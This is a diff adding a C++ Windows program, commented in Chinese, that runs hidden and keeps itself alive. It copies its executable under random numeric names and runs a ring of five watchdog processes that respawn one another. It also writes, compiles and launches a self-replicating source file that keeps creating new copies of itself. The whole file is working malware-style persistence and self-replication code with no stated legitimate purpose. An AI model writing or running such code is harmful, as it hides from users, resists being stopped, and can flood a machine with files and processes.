@@ -1,0 +1,205 @@
+#include <windows.h>
+#include <bits/stdc++.h>
+#include <tlhelp32.h>
+
+using namespace std;
+
+// 启动指定命令行进程，返回是否成功
+bool LaunchProcess(const string& cmdLine) {
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    char* pCmd = new char[cmdLine.size() + 1];
+    strcpy(pCmd, cmdLine.c_str());
+    BOOL ok = CreateProcess(NULL, pCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
+                            NULL, NULL, &si, &pi);
+    delete[] pCmd;
+    if (!ok) return false;
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return true;
+}
+
+// 检查是否存在正在运行的 copy_*.exe 进程
+bool CopyExeProcessExists() {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    bool found = false;
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            string procName = pe.szExeFile;
+            if (procName.size() > 5 &&
+                procName.substr(0, 5) == "copy_" &&
+                procName.substr(procName.size() - 4) == ".exe") {
+                found = true;
+                break;
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+    return found;
+}
+
+// 创建 copy_<时间戳>.exe 并运行（使用互斥锁防止多个守护进程同时创建）
+void CreateAndRunCopyExe() {
+    HANDLE hGuard = CreateMutex(NULL, FALSE, "Global\\CopyExeCreationGuard");
+    if (hGuard == NULL) return;
+
+    DWORD waitResult = WaitForSingleObject(hGuard, 2000);
+    if (waitResult != WAIT_OBJECT_0) {
+        CloseHandle(hGuard);
+        return;
+    }
+
+    // 双重检查
+    if (CopyExeProcessExists()) {
+        ReleaseMutex(hGuard);
+        CloseHandle(hGuard);
+        return;
+    }
+
+    string timestamp = to_string(chrono::high_resolution_clock::now().time_since_epoch().count());
+    string cppFile = "copy_" + timestamp + ".cpp";
+    string exeFile = "copy_" + timestamp + ".exe";
+
+    ofstream out(cppFile);
+    out << "#include <bits/stdc++.h>\n"
+        << "#include <windows.h>\n"
+        << "using namespace std;\n"
+        << "void r(const string& c,bool w){\n"
+        << "    STARTUPINFO si={sizeof(si)};\n"
+        << "    PROCESS_INFORMATION pi;\n"
+        << "    si.dwFlags=STARTF_USESHOWWINDOW;\n"
+        << "    si.wShowWindow=SW_HIDE;\n"
+        << "    char* p=new char[c.size()+1];\n"
+        << "    strcpy(p,c.c_str());\n"
+        << "    if(CreateProcess(NULL,p,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){\n"
+        << "        if(w) WaitForSingleObject(pi.hProcess,INFINITE);\n"
+        << "        CloseHandle(pi.hProcess);\n"
+        << "        CloseHandle(pi.hThread);\n"
+        << "    }\n"
+        << "    delete[] p;\n"
+        << "}\n"
+        << "int main(){\n"
+        << "    string f=\"copy_\"+to_string(chrono::high_resolution_clock::now().time_since_epoch().count())+\".cpp\";\n"
+        << "    { ifstream s(__FILE__); string c((istreambuf_iterator<char>(s)),istreambuf_iterator<char>()); ofstream o(f); o<<c; }\n"
+        << "    string e=f.substr(0,f.find_last_of('.'));\n"
+        << "    r(\"g++ \"+f+\" -o \"+e+\".exe -std=c++11 -mwindows\",1);\n"
+        << "    r(e+\".exe\",0);\n"
+        << "}\n";
+    out.close();
+
+    string compileCmd = "g++ " + cppFile + " -o " + exeFile + " -std=c++11";
+    if (LaunchProcess(compileCmd)) {
+        Sleep(2000); // 等待编译
+        LaunchProcess(exeFile);
+    }
+
+    ReleaseMutex(hGuard);
+    CloseHandle(hGuard);
+}
+
+// 获取角色对应的互斥体名称
+string GetMutexName(int role) {
+    return "Global\\ProcessProtector_Role" + to_string(role);
+}
+
+// 判断互斥体是否存在（即对应角色是否存活）
+bool IsRoleAlive(int role) {
+    HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, GetMutexName(role).c_str());
+    if (hMutex == NULL) return false;
+    CloseHandle(hMutex);
+    return true;
+}
+
+// 生成随机数字字符串（15位）
+string GenerateRandomNumber() {
+    random_device rd;
+    mt19937_64 gen(rd());
+    gen.seed(chrono::high_resolution_clock::now().time_since_epoch().count());
+    uniform_int_distribution<unsigned long long> dis(100000000000000ULL, 999999999999999ULL);
+    return to_string(dis(gen));
+}
+
+// 复制自身 exe 为新的随机数字文件名，返回新文件完整路径（失败返回空串）
+string CopySelfAsRandomExe() {
+    char selfPath[MAX_PATH];
+    GetModuleFileName(NULL, selfPath, MAX_PATH);
+    string srcPath = selfPath;
+
+    // 提取目录
+    size_t pos = srcPath.find_last_of("\\/");
+    string dir = (pos == string::npos) ? "" : srcPath.substr(0, pos + 1);
+
+    string newName = GenerateRandomNumber() + ".exe";
+    string newPath = dir + newName;
+
+    if (CopyFile(srcPath.c_str(), newPath.c_str(), FALSE)) {
+        return newPath;
+    }
+    return "";
+}
+
+// 角色进程主循环
+void RunRole(int role) {
+    // 创建自己的互斥体，若已存在则退出（防止重复角色）
+    HANDLE hMyMutex = CreateMutex(NULL, TRUE, GetMutexName(role).c_str());
+    if (hMyMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
+        if (hMyMutex) CloseHandle(hMyMutex);
+        return;
+    }
+
+    int nextRole = (role + 1) % 5;
+
+    // 隐藏窗口
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    while (true) {
+        // 1. 检查下一个角色是否存活，若缺失则复制自身为新随机名并启动
+        if (!IsRoleAlive(nextRole)) {
+            string newExePath = CopySelfAsRandomExe();
+            if (!newExePath.empty()) {
+                string cmd = "\"" + newExePath + "\" --role " + to_string(nextRole);
+                LaunchProcess(cmd);
+            }
+        }
+
+        // 2. 所有角色都监控 copy_*.exe 进程
+        if (!CopyExeProcessExists()) {
+            CreateAndRunCopyExe();
+        }
+
+        Sleep(1000); // 每秒检查一次
+    }
+}
+
+int main(int argc, char* argv[]) {
+    // 解析是否为角色进程
+    bool isRole = false;
+    int role = 0;
+    for (int i = 1; i < argc; ++i) {
+        if (string(argv[i]) == "--role") {
+            isRole = true;
+            if (i + 1 < argc) role = atoi(argv[i + 1]);
+            break;
+        }
+    }
+
+    if (isRole) {
+        // 作为角色进程运行
+        RunRole(role);
+    } else {
+        // 初始启动器：复制自身为随机名并启动角色0，然后退出
+        string newExePath = CopySelfAsRandomExe();
+        if (!newExePath.empty()) {
+            string cmd = "\"" + newExePath + "\" --role 0";
+            LaunchProcess(cmd);
+        }
+        // 启动器立即退出
+    }
+    return 0;
+}
